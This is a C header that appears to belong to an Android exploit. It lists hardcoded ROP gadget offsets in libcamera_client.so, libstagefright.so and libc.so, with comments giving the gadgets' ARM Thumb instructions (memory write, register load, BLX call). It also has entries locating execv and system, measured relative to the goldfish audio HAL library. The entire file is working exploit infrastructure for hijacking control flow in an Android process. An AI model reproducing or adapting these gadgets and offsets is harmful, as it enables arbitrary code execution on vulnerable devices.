#ifndef __GADGETS_H__
#define __GADGETS_H__

namespace android {

/**
 * Represents the needed information about a gadget used.
 */
struct gadget_info {
	//The offset of the library containing the gadget from the library containing the modified pointers.
	//In this case, this is the offset between the base address of the containing library and the 
	//audio.primary.goldfish.so library.
	int library_offset;

	//The offset of the gadget from the load address of the library in which it is contained.
	int gadget_offset; 
};

//The write gadget which is contained in libcamera_client.so
//The actual gadget is:
// LDR R2, [R1, #0]
// STR R2, [R0, #0]
// LDR R1, [R1, #4]
// LDR.W R2, [R2, #-12]
// STR R1, [R0, R2]
// BX LR
struct gadget_info write_gadget_info = {
	.library_offset = -0xA91000,
	.gadget_offset = 0x208f0 + 1, //THUMB
};

//The BX-LR gadget, which is contained in libcamera_client.so
struct gadget_info bx_lr_gadget_info = {
	.library_offset = -0xA91000,
	.gadget_offset = 0x208FC + 1, //THUMB
};

struct gadget_info read_r0_offset_108 =  {
	.library_offset = -0x4F0000,
	.gadget_offset = 0x25302 + 1,
};

//The gadget used to call a function, contained in libstagefright.so
//The actual gadget is:
// LDR R3, [R0, #36]
// LDR R0, [R0, #32]
// BLX R3
struct gadget_info blx_gadget = {
	.library_offset = -0x804000,
	.gadget_offset = 0x5EF88 + 1, //THUMB
};

//The location information of the "execv" function in libc.so
struct gadget_info execv_gadget = {
	.library_offset = -0xD8E000,
	.gadget_offset = 0x1E6B0 +1, //THUMB
};

struct gadget_info system_gadget = {
	.library_offset = -0xD8E000,
	.gadget_offset = 0x1FC00 + 1, //THUMB
};

}

#endif
